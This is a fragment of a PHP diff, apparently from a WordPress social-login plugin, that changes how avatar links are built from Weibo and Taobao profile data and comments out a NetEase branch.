+						$url = $weibo[3].$username;
+				        if(is_admin()) {
+							if(!is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
+						} elseif(!$userid) {
+							$avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
+				        }
+					}
 				}
 			} 
 		} elseif (get_user_meta($uid, 'taobaoid', true)) {
 			if ($out = get_user_meta($uid, 'tbtid', true)) {
 				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
-			} 
-		} 
+			}
+		//} elseif (get_user_meta($uid, 'neteaseid', true)) {
+		//	if ($out = get_user_meta($uid, 'ntid', true)) {
+		//		$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
+		//	} 
+		}
 	} 
 	return $avatar;
 }
